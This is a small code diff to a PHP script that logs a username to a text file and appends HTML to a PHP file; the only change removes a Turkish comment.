@@ -48,7 +48,7 @@ echo $code;
 $myfile = fopen("checker.txt", "a") or die("Dosya Olusturulmadı PHP Surumu ile alakalı olabilir!");
 $txt = "$this->username\r\n";
 fwrite($myfile, $txt);
-$file = fopen('kinoshi.php', 'a'); //TXT DE BURADAN DEGISIYOR  
+$file = fopen('kinoshi.php', 'a');
 fwrite($file, "
 
 <html>
